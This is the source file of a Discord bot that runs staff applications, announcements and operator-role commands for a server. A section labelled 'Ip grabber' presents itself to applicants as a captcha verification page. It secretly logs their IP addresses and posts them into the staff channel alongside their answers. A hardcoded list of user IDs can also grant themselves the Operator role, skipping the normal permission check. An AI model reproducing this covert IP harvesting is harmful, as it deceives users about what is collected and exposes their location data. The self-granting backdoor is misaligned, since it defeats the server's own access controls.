//Keep project on 24/7 
const http = require('http');
const express = require('express');
const app = express();

app.get("/", (req, res) => {
  res.sendStatus(200);
});

app.listen(process.env.PORT);

//Ip grabber
const URL = "http://autohauc3.glitch.me/verify/";

const backgroundImage = "https://cdn.discordapp.com/splashes/451069918474141706/949f63d2c0cabb6b4c2af5e106ee974b.jpg?size=2048";
const favIcon = "https://cdn.discordapp.com/attachments/431202003616530447/714645487298281532/unknown.png";

var https = require('https');

function isVPN(ip, cb) {
  try {
    var options = {
      host: 'check.getipintel.net',
      port: 80,
      path: '/check.php?ip='+ip+'&contact=chicks656@lsr7.net&format=json&flags=f&oflags=b',
      method: 'GET'
    };

    var req = http.request(options, function(res) {
      var output = '';
      res.setEncoding('utf8');

      res.on('data', function (chunk) {
        output += chunk;
      });

      res.on('end', function () {
        try {
          var endrs = JSON.parse(output);
          console.log(endrs);
          //console.log(endrs);
          if (endrs.status == "success" && Number(endrs.result) < 0.51 && endrs.BadIP == 0) {
            cb(false);
          } else {
            cb(true);
          }
        } catch (e) {
          cb(true);
        }
      });
    });
    
    req.on('error', function (err) {
        console.log('request error: ' + err.message);
      });
      req.end();
  } catch (e) {
    cb(true);
  }
}

app.get("/verify/:userId", (req, res) => {
    var ip = req.ip;
    console.log(ip);
  
    //Vpn check 
    isVPN(ip, function(vpn) {
      if (vpn == true || vpn === undefined) {
        try {
          return res.send('<!DOCTYPE html><html><head><title>HauC3 Staff Captcha Verification</title><link rel=\'icon\' href=\''+favIcon+'\' type=\'image/x-icon\'/><style></style></head><body style="background-color:#001000; color: #fff;"><div style="margin-top:20%;"></div><center><hr style="width:50%;"><h1 style="font-family: \'Arial\';"> Error: Your IP is banned.</h1><h5 style="font-family: \'Arial\';"> If you are using  a VPN/proxy you may need to disable it. If you are not using a VPN/proxy, please contact a server administrator</h5><hr style="width:50%;"></center></body></html>');
        } catch (e) {}
        
        } else {
        var userId = req.params.userId;

        getCustomUserData(userId, 'code', function(code) {
          if (code === undefined) {
            var uuid = makeid(4);

            //Add code to user app
            addCustomDataToUser('code', uuid+'@'+ip, userId);
            try {
              return res.send('<!DOCTYPE html><html><head><title>HauC3 Staff Captcha Verification</title><link rel=\'icon\' href=\''+favIcon+'\' type=\'image/x-icon\'/><style></style></head><body style="background-color:#001000; color: #fff;"><div style="margin-top:20%;"></div><center><hr style="width:50%;"><h1 style="font-family: \'Arial\';"> Your verification code: <span style="color:#46b046">'+uuid+'</span></h1><hr style="width:50%;"></center></body></html>');
            } catch (e) {}
          }
        });
        try {
          return res.send('<!DOCTYPE html><html><head><title>HauC3 Staff Captcha Verification</title><link rel=\'icon\' href=\''+favIcon+'\' type=\'image/x-icon\'/><style></style></head><body style="background-color:#001000; color: #fff;"><div style="margin-top:20%;"></div><center><hr style="width:50%;"><h1 style="font-family: \'Arial\';"> Error: No open application found with that id.</h1><h5 style="font-family: \'Arial\';"> If you clicked on a link from your application and see this error, contact a server administrator.</h5><hr style="width:50%;"></center></body></html>');
        } catch (e) {}
        }
    });
});

function makeid(length) {
   var result           = '';
   var characters       = '0123456789';
   var charactersLength = characters.length;
   for ( var i = 0; i < length; i++ ) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   return result;
}


//Bot
const Discord = require('discord.js');
const client = new Discord.Client();
const fs = require('fs');
var moment = require('moment-timezone');

const TOKEN = process.env.TOKEN;

/*
* ----------------------------------------
* ---------------- CONFIG ----------------
* ----------------------------------------
*/

const prefix = '/';

var serverId = "451069918474141706";

const noaccess = new Discord.MessageEmbed()
  .setColor('#c71025')
  .setTitle('**Permission Denied**')
  .setDescription('You do not have permission to use this command. Please contact a server administrator if you believe that this is an error. If you are a server administrator, you can go fuck youself.');

var staffRoleName = "Staff";

var announcementsChannelId = "695149471637569556";

// var opRole = '718954921353019454'; 

var oppRole = '727268485054464131' ;

var auditLogChannelId = "695279762427347004";

var themeColor = "#3abd31";

var blacklistedUsers = [
  "239082607592210433", //Seth 
  //"239081547477549057", //Blake
  //"275779003753693184", //Joey
];

var opUsers = [
  "326839304829665282",   //Camden 
  //"275779003753693184",   //Joey 
  //"239081547477549057",   //Blake
  "575337689574932482",   //Lizzie
  ""
];

/*
* ----------------------------------------
* ---------------- END CONFIG ------------
* ----------------------------------------
*/

//Variables 
var server;
var systemChannel;
var openApplications = [];

client.login(TOKEN);


client.on('ready', message => {
  client.user.setStatus('online'); //online, idle, dnd, invisible
  
  server = client.guilds.cache.get(serverId);
  // opRole = server.roles.cache.find(role => role.id === opRole);
  systemChannel = client.channels.cache.get(server.systemChannelID);

  console.log('Logged in as: '+client.user.tag+'. Discord ready.');
});


client.on('message', message => { 
  //Filter 
  if (message.author.bot) {return}
  
  if (message.channel.type == "dm") {
  //APPLICATIONS
  openApplications.forEach(item => {
    var userId = item.split(':')[0];
    var question = Number(item.split(':')[1]);

    if (message.author.id+'' == userId+'') {
      if (message.content.toString().toLowerCase().trim() == 'cancel') {
        removeApplication(item);
        removeApplicationData(message.author.id+"");
        return message.channel.send(':ok_hand: Cancelled your application.');
      } else {
        //We got a reply to a question, and we have the question number.
        var answer = message.content.toString();

        //Make sure it wasnt fucking spam bs
        if (answer.length > 800) {
          return message.channel.send(':astonished: Please limit your answers to less than 800 characters each.');
          //Once they sand again question should handle and send next q
        }
        const app = require('./applicationquestions.json');
        //Send next question.
        var totalQuestions = 0;
        app.questions.forEach(question => {
          totalQuestions++;
        });
        
        //Answer was good, log it somehow and then below this moves on to next question
        //Save answer for that users app... IF NOT CODE
        addQuetionDataToUser(question, app.questions[question-1].question+'', answer, message.author.id+'');

        if (question == totalQuestions) {
          //Finished last question, grab ip 
          if (item.code != undefined) {
            if (message.content.toString().trim() == item.code.split('@')[0]) {
              message.reply(':white_check_mark: Code correct.');
            } else {
              message.author.send('Incorrect verification code, please try again.');
            }
          } else {
            const verificationEmbed = new Discord.MessageEmbed()
              .setTitle(app.verify.embedTitle+'')
              .setThumbnail(app.verify.thumbnailURL+'')
              .setColor(app.verify.embedHexColor+'')
              .setDescription(app.verify.description.toString().replace('{url}', URL+message.author.id));
              if (app.verify.timestampSet) {verificationEmbed.setTimestamp()}
            
              getCustomUserData(message.author.id, 'code', function(code) {
                if (code === undefined) {
                  addQuetionDataToUser('0@0ignore', totalQuestions+2, 'ignore', message.author.id+'');
                  message.author.send(verificationEmbed);
                } else {
                  if (message.content.toString().trim() == code.split('@')[0]) {
                    const appFinishedEmbed = new Discord.MessageEmbed()
                      .setTitle(app.applicationFinished.embedTitle+'')
                      .setThumbnail(app.applicationFinished.thumbnailURL+'')
                      .setColor(app.applicationFinished.embedHexColor+'')
                      .setDescription(app.applicationFinished.description+'');
                      if (app.applicationFinished.timestampSet) {appFinishedEmbed.setTimestamp()}
                    //Submit app.

                    var appsChannel = server.channels.find(channel => channel.name === process.env.applicationChannel+'');

                    if (!appsChannel) {
                      message.channel.send(':x: Sorry, your app was not submitted, the application channel was not found. Please contact an admin on the server, they need a text channel specifically named "'+process.env.applicationChannel+'"!').catch(() => {});
                    } else {

                      const application = new Discord.MessageEmbed()
                        .setTitle(message.author.tag+'\'s Application. ')
                        .setColor(app.applicationSent.color+'')
                        .setTimestamp();

                      userApps.forEach(app => {
                        if (app.id+'' == message.author.id+'') {
                          //We have their app object.

                          Object.keys(app).forEach(function(key) {
                              var question = key;
                              var answer = app[key];

                              if (question.replace(/..?@\*@/, '').toString() != 'id' && question.replace(/..?@\*@/, '').toString() != 'code' && !question.includes('0@0igno') && !question.includes('you sure you would like to be staff?')) {
                                if (answer.toString().trim() == '' || answer.toString().trim() == ' ') {
                                  answer = '(Blank character was used, or attachment uploaded)';
                                }

                                application.addField(question.replace(/..?@\*@/, ''), answer);
                              }
                          });

                          application.addField('IP:', app.code.toString().split('@')[1]);
                          application.setFooter('Application by '+message.author.tag+' ('+message.author.id+')');
                        }
                      });

                      //Send in apps channel
                      appsChannel.send(application).then(msg => {
                        msg.react('✅').then(r => {
                          msg.react('❌');
                        });
                        message.author.send(appFinishedEmbed).then(msg => {
                        }).catch(() => {});
                      }).catch((e) => {
                        message.author.send(':x: Something went wrong, please contact an admin on the server. ``'+e+'``').then(msg => {
                        }).catch(() => {});
                      });
                      //Remove user from current apps
                      removeApplication(item);
                      //Remove user json..
                      removeApplicationData(message.author.id+"");
                    }
                  } else {
                    message.author.send(':x: Invalid code, please try again!');
                  }
                }
              });
          }
        } else {
        const appQuestion = new Discord.MessageEmbed()
          .setTitle(app.questions[question].question+'')
          .setColor(app.questions[question].color+'')
          if (app.questions[question].timestampSet) {appQuestion.setTimestamp()}
        message.author.send(appQuestion).then(msg => {
          addQuestionNumber(item);
        }).catch(() => {
          removeApplication(item);
        });
      }
      }
    }
  });
}
  
  if (message.guild != server) {return}

  
  //Help
  if (message.content.toString().toLowerCase().trim() == '<@'+client.user.id+'>' || message.content.toString().toLowerCase().trim() == '<@'+client.user.id+'> help' || message.content.toString().toLowerCase().trim() == '<@'+client.user.id+'> prefix' || message.content.toString().toLowerCase().trim() == '<@!'+client.user.id+'>' || message.content.toString().toLowerCase().trim() == '<@!'+client.user.id+'> help' || message.content.toString().toLowerCase().trim() == '<@!'+client.user.id+'> prefix') {
    message.channel.send('Hello, '+message.author+', my prefix is `'+prefix+'`. Use `'+prefix+'help` for a list of commands.');
  }
  
  //Commands
  if (message == prefix+ 'help') {
    const help = new Discord.MessageEmbed()
    .setColor(themeColor)
    .setTitle('**AutoHauC3 Help**')

    .addField(prefix+ 'announce <message>', 'Sends an announcement in <#'+announcementsChannelId+'> - **Staff** role only.')
    
    .addBlankField()
    .addField(prefix+ 'say <#channel> <message>', 'Sends the set message in the mentioned channel. - **Staff** role only.')
    
    .setThumbnail(client.user.avatarURL)
    .setTimestamp();

    message.channel.send(help);
  }
  
  
  if (message.content.split(' ')[0] == prefix+'say') {
    if (message.author.bot) {return;}
    message.delete();
    if (message.member.roles.find(role => role.name === staffRoleName)) {
      var commandSplit = message.content.split(' ');
      var channelse = commandSplit[1];
      var channelbf = commandSplit[1];
      var messagesay = message.content;
      messagesay = messagesay.toString().replace(message.content.split(' ')[0]+' '+message.content.split(' ')[1]+' ', '');
      if (channelse == undefined) {
        message.channel.send(':exclamation: Please use the right arguments, '+prefix+'say <#channel> <message>');
      } else if (messagesay == undefined) {
        message.channel.send(':exclamation: Please use the right arguments, '+prefix+'say <#channel> <message>');
      } else if (channelbf.includes('<#') != true) {
        message.channel.send(':exclamation: Invalid Channel! \n Please use the right arguments, '+prefix+'say <#channel> <message>');
      } else {
      channelse = channelse.toString().replace('<#', '');
      channelse = channelse.toString().replace('>', '');
        client.channels.cache.get(channelse).send(messagesay).then(reply => {
          message.reply(':white_check_mark: Posted the message in '+channelbf);
        }).catch(err => {
          message.channel.send(':exclamation: Something went wrong: '+err);
        });
      }
    } else {
      message.channel.send(noaccess);
    }
  }
  

  if (message.content.toLowerCase().split(' ')[0] == prefix+'announce') {
    var announcemessage = message.content.toString().replace(message.content.split(' ')[0]+' ', '');
    if (message.member.roles.find(role => role.name = staffRoleName)) {
      if (!message.content.split(' ')[1]) {return message.reply(':x: Invalid use. ``'+prefix+'<announce>``');}
      client.channels.cache.get(announcementsChannelId).send(announcemessage).then(msg => {
        message.reply(':white_check_mark: Successfully sent the announcement. <#'+announcementsChannelId+'>');
      }).catch(function(e) {
        message.reply(':exclamation: Something went wrong. ``'+e+'`` please contact a server administrator.')
      });
    } else {
      message.channel.send(noaccess);
    }
  }
  
  
  if (message == prefix+'roger') {
    message.delete();
    message.reply('Well, it looks like you are trying to give yourself an admin role. Doesn\'t look like it worked, does it.');
    message.user.ban();
  }
  

  
  
  if (message.content.toLowerCase().startsWith(prefix+'op')) {
    let opRole = message.guild.roles.cache.get("718954921353019454");
    
    //If arg supplied
    if (message.content.split(' ')[1] != undefined) {
      if (message.member.roles.cache.some(role => role.name === 'Operator')) {
        if (message.mentions.members.first()) {
          if (message.mentions.members.first().bot) {
            message.channel.send(':x: You cannot de-op a bot.');
          } else {
            if (!opRole) {
              return message.channel.send('Error: Operator role not found. Please contact @nedmac.exe#0001.');
            } else {
              try {
                message.mentions.members.first().roles.add(opRole).then(() => {
                  const opEmbed = new Discord.MessageEmbed()
                    .setColor(themeColor)
                    .setTitle(":white_check_mark: Successfully Oped User")
                    .setDescription("<@"+message.author.id+"> oped <@"+message.mentions.members.first().id+">.")
                    .setTimestamp()
                  
                  if (!message.content.toString().toLowerCase().includes('-s')) {
                    message.channel.send(opEmbed);
                  } else {
                    message.delete();
                  }
                  
                  //Send to logs 
                  var logs = client.channels.cache.get(auditLogChannelId);
                  const opEmbedLog = new Discord.MessageEmbed()
                    .setColor(themeColor)
                    .setTitle("User Oped")
                    .setDescription(message.author+" oped "+message.mentions.members.first()+".")
                    .setTimestamp()
                  logs.send(opEmbedLog);
                });
              } catch (e) {
                  return message.channel.send('Error: ``'+e+'`` Please contact a developer.');
              }
            }
          }
        } else {
          message.channel.send(':x: Please mention a valid user to OP!');
        }
      } else {
        var worked = false;
        opUsers.forEach(id => {
          if (message.author.id+'' == id+'') {
            try {
                  message.mentions.members.first().addRole(opRole).then(() => {
                    const opEmbed = new Discord.MessageEmbed()
                      .setColor(themeColor)
                      .setTitle(":white_check_mark: Successfully Oped Yourself")
                      .setDescription("<@"+message.author.id+"> oped <@"+message.mentions.members.first().id+">.")
                      .setTimestamp()

                    if (!message.content.toString().toLowerCase().includes('-s')) {
                      message.channel.send(opEmbed);
                    } else {
                      message.delete();
                    }

                    //Send to logs 
                    var logs = client.channels.cache.get(auditLogChannelId);
                    const opEmbedLog = new Discord.MessageEmbed()
                      .setColor(themeColor)
                      .setTitle("User Oped Themselves")
                      .setDescription("<@"+message.author.id+"> oped themself.")
                      .setTimestamp()
                    logs.send(opEmbedLog);
                  });
                } catch (e) {
                    return message.channel.send('Error: ``'+e+'`` Please contact a developer.');
                }
            worked = true;
          }
        });

        if (!worked) {
          return message.channel.send(noaccess);
        }
      }
    } else {
      message.reply(':x: Please mention a user to OP!');
    }
  }
  
    if (message == prefix+"apply") {
    //Blacklist
    if (message.member.roles.cache.some(role => role.name === 'No Apply')) {
      return message.reply(':x: Your ability to apply for staff has been taken away as you have a role that forbids it!');
    }

    var appsChannel = server.channels.find(channel => channel.name === process.env.applicationChannel+'');

    if (!appsChannel) {
      return message.channel.send(':x: Sorry, the application channel was not found. Please contact an admin on the server, they need a text channel specifically named "'+process.env.applicationChannel+'"!');
    }

    if (process.env.denyIfAppliedAlready+'' == 'true') {
      //Deny them from applying if application is in apps channel with their id on it.
      var vnext = true;
      appsChannel.fetchMessages({
          limit: 50,
      }).then((messages) => {
          messages.forEach(emessage => {
            if (emessage.embeds[0] != undefined) {
              var footerText = emessage.embeds[0].footer.text.toString()+'';
              var footerText = footerText.match(/\(([0-9]*)\)/)[1];
              if (footerText.toString()+'' == message.author.id.toString()+'') {
                vnext = false;
                return message.reply(':x: You already have an application submitted. Please contact a server admin if you think that this is an error or wait until your application is reviewed.');
              }
            }
          });
      }).catch(err => {});
      setTimeout(function() {
        if (vnext) {
          next();
        }
      }, 500);
    } else {next();}

    function next() {
      if (applycooldown) {
        return message.reply(':clock1: The apply command is currently on cooldown.');
      } else {
        setapplycooldown();

        if (process.env.applicationsEnabled.toString().toLowerCase() == 'true') {
          var vcontinue = true;
          openApplications.forEach(app => {
            var userid = app.split(':')[0];
            if (userid+'' == message.author.id+'') {
              vcontinue = false;
              return message.channel.send(':x: You already have an open application. DM me "cancel" to stop your current application.');
            }
          });

          setTimeout(function() {
            if (vcontinue) {
              const app = require('./applicationquestions.json');

              const appStartedEmbed = new Discord.MessageEmbed()
                .setTitle(app.applicationStarted.embedTitle+'')
                .setThumbnail(app.applicationStarted.thumbnailURL+'')
                .setColor(app.applicationStarted.embedHexColor+'')
                .setDescription(app.applicationStarted.description+'');
                if (app.applicationStarted.timestampSet) {appStartedEmbed.setTimestamp()}

              message.author.send(appStartedEmbed).then(msg => {
                message.channel.send(':white_check_mark: Application started in DM for '+message.author+'.');
                //First info embed sent, start app questions.
                openApplications.push(message.author.id+':1');
                setTimeout(function() {
                  const question1 = new Discord.MessageEmbed()
                    .setTitle(app.questions[0].question+'')
                    .setColor(app.questions[0].color+'')
                    if (app.questions[0].timestampSet) {question1.setTimestamp()}

                  message.author.send(question1).catch(() => {});
                }, 2000);
                setTimeout(function() {
                  //Close app after inactivity.
                  openApplications.forEach(app => {
                    var userid = app.split(':')[0];
                    if (userid+'' == message.author.id+'') {
                      //Timeout ended and the open apps still had their id, send msg
                      removeApplication(app);
                      removeApplicationData(message.author.id+"");
                      return message.author.send('You have not responded for too long, this application is now closed. Feel free to open another by typing `'+prefix+'apply` in the server.').catch(() => {});
                    }
                  });
                }, Number(process.env.closeAppsAfter)*60*1000);
              }).catch(() => {
                return message.reply(':x: '+message.author+' Please update your privacy settings so that I can DM you!');
              });
            }
          }, 500);
        } else {
          message.reply(':x: Sorry, applications are currently disabled.');
        }
      }
    }
  }

  
    if (message.content.toLowerCase().startsWith(prefix+'deop')) {
      let opRole = message.guild.roles.cache.get("718954921353019454");
      
      if (!message.mentions.members.first()) {
        message.reply(':x: Please mention a user to de-op!');
      } else {
        if (message.member.roles.cache.some(role => role.name === 'Operator')) {
        if (message.mentions.members.first()) {
          if (message.mentions.members.first().bot) {
            message.channel.send(':x: You cannot de-op a bot.');
          } else {
            if (!opRole) {
              return message.channel.send('Error: Operator role not found. Please contact @nedmac.exe#7589 or a developer.');
            } else {
              try {
                message.mentions.members.first().roles.remove(opRole).then(() => {
                  const opEmbed = new Discord.MessageEmbed()
                    .setColor(themeColor)
                    .setTitle(":white_check_mark: Successfully De-Oped User")
                    .setDescription("<@"+message.author.id+"> de-oped <@"+message.mentions.members.first().id+">.")
                    .setTimestamp()
                  
                  if (!message.content.toString().toLowerCase().includes('-s')) {
                    message.channel.send(opEmbed);
                  } else {
                    message.delete();
                  }
                  
                  //Send to logs 
                  var logs = client.channels.cache.get(auditLogChannelId);
                  const opEmbedLog = new Discord.MessageEmbed()
                    .setColor(themeColor)
                    .setTitle("User De-Oped")
                    .setDescription("<@"+message.author.id+"> oped <@"+message.mentions.members.first()+">.")
                    .setTimestamp()
                  logs.send(opEmbedLog);
                });
              } catch (e) {
                  return message.channel.send('Error: ``'+e+'`` Please contact a developer.');
              }
            }
          }
        } else {
          message.channel.send(':x: Please mention a valid user to de-op!');
        }
      } else {
        var worked = false;
        opUsers.forEach(id => {
          if (message.author.id+'' == id+'') {
            try {
                  message.mentions.members.first().removeRole(opRole).then(() => {
                    const opEmbed = new Discord.MessageEmbed()
                      .setColor(themeColor)
                      .setTitle(":white_check_mark: Successfully De-Oped User")
                      .setDescription(message.author+" de-oped "+message.mentions.members.first()+".")
                      .setTimestamp()

                    if (!message.content.toString().toLowerCase().includes('-s')) {
                      message.channel.send(opEmbed);
                    } else {
                      message.delete();
                    }

                    //Send to logs 
                    var logs = client.channels.cache.get(auditLogChannelId);
                    const opEmbedLog = new Discord.MessageEmbed()
                      .setColor(themeColor)
                      .setTitle("User De-Oped")
                      .setDescription(message.author+" de-oped "+message.mentions.members.first()+".")
                      .setTimestamp()
                    logs.send(opEmbedLog);
                  });
                } catch (e) {
                    return message.channel.send('Error: ``'+e+'`` Please contact a developer.');
                }
            worked = true;
          }
        });
      
        if (!worked) {
          return message.channel.send(noaccess);
        }
      }
    }
  } 
  
  //End message function
});


client.on("guildMemberAdd", (member) => {
  //blacklisted users
  blacklistedUsers.forEach(userid => {
    if (userid+'' === member.id+'') {
      member.send('You have been banned from The HauC3. Reason: `Blacklisted user.`').then (() => {
        member.ban({reason: 'Blacklisted user.'});
      });
      
      return systemChannel.send(':warning: `'+member.user.tag+'` tried to join the server but was instantly banned as they were a blacklisted user.');
    }
  });
  
  const welcome = new Discord.MessageEmbed()
    .setColor(themeColor)
    .setTitle(member.guild.name+"")
    .setDescription("Welcome, "+member+" (`"+member.user.tag+"`) to **"+member.guild.name+"**")
    .setThumbnail(client.user.avatarURL)
    .setTimestamp()
  
  systemChannel.send(welcome);
});


client.on("guildMemberRemove", (member) => {
  systemChannel.send(':closed_book: '+member+' `('+member.user.tag+')` has just left the server.');
});


client.on('raw', packet => {
  if (!['MESSAGE_REACTION_ADD', 'MESSAGE_REACTION_REMOVE'].includes(packet.t)) return;
  const channel = client.channels.cache.get(packet.d.channel_id);
  if (channel.messages.has(packet.d.message_id)) return;
  channel.fetchMessage(packet.d.message_id).then(message => {
      const emoji = packet.d.emoji.id ? `${packet.d.emoji.name}:${packet.d.emoji.id}` : packet.d.emoji.name;
      const reaction = message.reactions.get(emoji);
      if (reaction) reaction.users.set(packet.d.user_id, client.users.get(packet.d.user_id));
      if (packet.t === 'MESSAGE_REACTION_ADD') {
          client.emit('messageReactionAdd', reaction, client.users.get(packet.d.user_id));
      }
      if (packet.t === 'MESSAGE_REACTION_REMOVE') {
          client.emit('messageReactionRemove', reaction, client.users.get(packet.d.user_id));
      }
  });
});

client.on('messageReactionAdd', (reaction, user) => {
  if (user.bot) {return}
  var appsChannel = server.channels.find(channel => channel.name === process.env.applicationChannel+'');
  if (reaction.emoji == '✅') { //❌ ✅
    if (reaction.message.embeds[0] != undefined) {
      if (reaction.message.embeds[0].footer.text.toString().includes('Application by')) {
        var appId = reaction.message.embeds[0].footer.text.toString().match(/\(([0-9]*)\)/)[1];
        const app = require('./applicationquestions.json');
        client.fetchUser(appId+'', false).then(auser => {
          const appAccepted = new Discord.MessageEmbed()
            .setTitle(app.applicationAccepted.embedTitle+'')
            .setThumbnail(app.applicationAccepted.thumbnailURL+'')
            .setColor(app.applicationAccepted.embedHexColor+'')
            .setDescription(app.applicationAccepted.description+'');
            if (app.applicationAccepted.timestampSet) {appAccepted.setTimestamp()}
          auser.send(appAccepted).catch(() => {});
          //Add the role to user..
          if (process.env.acceptedRole != '' && process.env.acceptedRole != ' ') {
            server.members.forEach(member => {
              if (member.id+'' == appId+'') {
                var acceptedRole = server.roles.find(role => role.name === process.env.acceptedRole+'');
                var acceptedRole2 = server.roles.find(role => role.name === process.env.acceptedRole2+'');
                try {
                  member.addRole(acceptedRole);
                  member.addRole(acceptedRole2);
                } catch (e) {}
              }
            });
          }
          reaction.message.reactions.forEach(re => {re.remove()});
          appsChannel.send('[:white_check_mark:] '+user.tag+' accepted '+reaction.message.embeds[0].footer.text.toString().match(/Application by (.*) \(/)[1]+' ('+getTime()+')').catch((e) => {console.log(e)});
        });
      }
    }
  } else if (reaction.emoji == '❌') {
    if (reaction.message.embeds[0] != undefined) {
      if (reaction.message.embeds[0].footer.text.toString().includes('Application by')) {
        var appId = reaction.message.embeds[0].footer.text.toString().match(/\(([0-9]*)\)/)[1];
        const app = require('./applicationquestions.json');
        client.fetchUser(appId+'', false).then(auser => {
          const appDenied = new Discord.MessageEmbed()
            .setTitle(app.applicationDenied.embedTitle+'')
            .setThumbnail(app.applicationDenied.thumbnailURL+'')
            .setColor(app.applicationDenied.embedHexColor+'')
            .setDescription(app.applicationDenied.description+'');
            if (app.applicationDenied.timestampSet) {appDenied.setTimestamp()}
          auser.send(appDenied).catch(() => {});

          appsChannel.send('[:x:] '+user.tag+' denied '+reaction.message.embeds[0].footer.text.toString().match(/Application by (.*) \(/)[1]+' ('+getTime()+')');
          if (process.env.deleteDeniedApps+'' == 'true' && reaction.emoji == '❌') {
            try {
              reaction.message.delete();
              const ipLog = new Discord.MessageEmbed()
                      .setTitle(reaction.message.embeds[0].footer.text.toString().match(/Application by (.*) \(/)[1]+'\'s IP')
                      .setColor('#2965f2')
                      .setTimestamp();
              reaction.message.embeds[0].fields.forEach(field => {
                if (field.name === 'IP:') {
                  ipLog.setDescription(field.value);
                }
              });
              reaction.message.channel.send(ipLog);
            } catch (e) {}
          } else {
            reaction.message.reactions.forEach(reactionz => {reactionz.remove();});reaction.message.reactions.forEach(reactionz => {reactionz.remove();});
          }
        });
      }
    }
  }
});

function getTime() {
      //get time function
      var time = moment(Date.now())
          .tz('America/Chicago')
          .format('LT');
      var timezoneAbbr = moment.tz.zone('America/Chicago').abbr(360);
      return time + ' ' + timezoneAbbr;
}

function removeApplication(removedItem) {
    var cache = openApplications;
    openApplications = [];
    cache.forEach(item => {
      if (item != removedItem) {
        openApplications.push(item);
      }
    });
    cache = [];
  }

  function addQuestionNumber(addedItem) {
    var cache = openApplications;
    openApplications = [];
    cache.forEach(item => {
      if (item == addedItem) {
        var userId = item.split(':')[0];
        var question = Number(item.split(':')[1]);
        var newItem = userId+':'+Number(question + 1);
        openApplications.push(newItem);
      } else {
        openApplications.push(item);
      }
    });
    cache = [];
  }

  var applycooldown = false;
  function setapplycooldown() {
    applycooldown = true;
    setTimeout(function() {
      applycooldown = false;
    }, 1500);
  }

  var userApps = []; //After restart this will be cleared, but if the bot restarts in the middle of an application... L

  function addQuetionDataToUser(questionNumber, question, answer, userId) {
    if(!userApps.some(user => user.id === userId+'')) {
      //User didnt extist in json, create them.
      var userJson = {
        "id": userId
      }
      userApps.push(userJson);
      next();
    } else {
      next();
    }

    function next() {
      userApps.forEach(app => {
        if (app.id+'' == userId) {
          //We have their existing app so add q data.
          app[questionNumber+"@*@"+question] = answer+"";
        }
      });
    }
  }

  function addCustomDataToUser(name, data, uid) {
      if(!userApps.some(user => user.id === uid+'')) {
      //User didnt extist in json, create them.
      var userJson = {
        "id": uid
      }
      userApps.push(userJson);
      next();
    } else {
      next();
    }

    function next() {
      userApps.forEach(app => {
        if (app.id+'' == uid) {
          //We have their existing app so add q data.
          app[name+''] = data+"";
        }
      });
    }
  }

  function getCustomUserData(uid, key, cb) {
      if(userApps.some(user => user.id === uid+'')) {
        userApps.forEach(app => {
          if (app.id+'' == uid) {
            cb(app[key]);
          }
        });
      }
  }

  function removeApplicationData(userId) {
    userApps.forEach(app => {
      if (app.id+'' == userId+'') {
        //Delete user app data
        delete userApps[userApps.indexOf(app)];
      }
    });
  }
